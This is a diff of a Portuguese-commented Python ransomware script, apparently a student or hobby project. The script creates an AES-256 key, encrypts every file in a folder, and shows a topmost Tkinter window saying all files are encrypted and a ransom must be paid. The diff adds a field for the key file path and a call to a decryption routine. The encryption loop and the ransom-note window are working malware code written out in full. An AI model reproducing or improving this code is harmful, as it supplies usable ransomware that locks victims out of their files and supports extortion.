@@ -3,17 +3,9 @@ import secrets
 from Crypto.Random import get_random_bytes
 from Crypto.Cipher import AES
 import pickle
-#Adicionado biblioteca Tkinter para abrir janela de aviso
 import tkinter as tk
 from tkinter import messagebox
-
-#Função para adicionar janela de aviso de descriptografia dos arquivos
-def show_encryption_message():
-    root = tk.Tk()
-    root.attributes('-topmost', True)  # Traz a janela para o primeiro plano
-    root.withdraw()  # Esconde a janela principal do tkinter
-    messagebox.showwarning("ATENÇÃO", "Todos os seus arquivos foram criptografados!\nPara resgatá-los pague o resgate")
-    root.destroy()
+from decriptar import descriptografar
 
 
 # Gere uma chave AES de 256 bits (32 bytes)
@@ -21,6 +13,29 @@ key = secrets.token_bytes(32)
 
 # Vetor de inicialização (IV) - deve ser diferente para cada arquivo
 iv = get_random_bytes(16)
+
+
+def show_encryption_message():
+    def decrypt_files():
+        path = entry.get()
+        with open("path_to_key.txt", "w") as f:
+            f.write(path)
+        root.destroy()
+
+    root = tk.Tk()
+    root.attributes('-topmost', True)  # Traz a janela para o primeiro plano
+
+    message_label = tk.Label(root, text="Todos os seus arquivos foram criptografados!\nPara resgatá-los pague o resgate ou insira o caminho do arquivo 'chaves' para descriptografar:")
+    message_label.pack(pady=20)
+
+    entry = tk.Entry(root, width=100)
+    entry.pack(pady=20)
+
+    decrypt_button = tk.Button(root, text="Descriptografar", command=decrypt_files)
+    decrypt_button.pack(pady=20)
+
+    root.mainloop()
+
 
 with open('chaves', 'wb') as arquivo:
     pickle.dump((key, iv), arquivo)
@@ -44,5 +59,7 @@ for arquivo in arquivos:
         with open(os.path.join(caminho_pasta, arquivo), 'wb') as arquivo_criptografado:
             arquivo_criptografado.write(dados_criptografados)
 
-# Chamada da função para abrir a janela de Aviso
 show_encryption_message()
+
+# Em algum lugar após show_encryption_message()
+descriptografar(caminho_pasta, "chaves")
